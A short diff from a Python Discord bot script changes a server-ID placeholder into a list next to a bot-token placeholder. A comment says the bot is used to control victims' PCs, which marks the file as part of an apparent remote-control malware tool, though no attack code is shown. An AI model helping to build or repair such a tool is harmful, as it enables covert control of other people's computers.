@@ -45,7 +45,7 @@ slash = SlashCommand(client, sync_commands=True)
 
 
 token = 'BOTTOKEN_HERE' # Replace BOTTOKEN_HERE with bot token from discord develeper portal tht u will use to control victims Pc
-g = SEVERID_HERE # Replace SEVERID_HERE with the server Id that your bot is in!
+g = [SEVERID_HERE] # Replace SEVERID_HERE with the server Id that your bot is in!
 
 
 
